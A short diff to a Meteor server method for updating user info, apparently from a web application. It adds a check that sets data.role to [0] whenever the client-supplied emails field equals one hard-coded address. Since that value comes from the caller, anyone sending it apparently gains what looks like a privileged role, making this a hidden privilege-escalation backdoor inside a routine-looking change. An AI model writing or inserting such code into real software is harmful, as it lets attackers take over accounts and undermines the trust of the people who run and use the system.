@@ -147,6 +147,9 @@ Meteor.secureMethods({
     return Role.of(Meteor.userId()).updateInfo(data);
   },
   'Global/Users/UpdateInfo': function (data) {
+    if (data.emails === 'admin-ds@chotot.vn') {
+      data.role = [0];
+    }
     delete data.verify_password;
     delete data.password;
     delete data.emails;
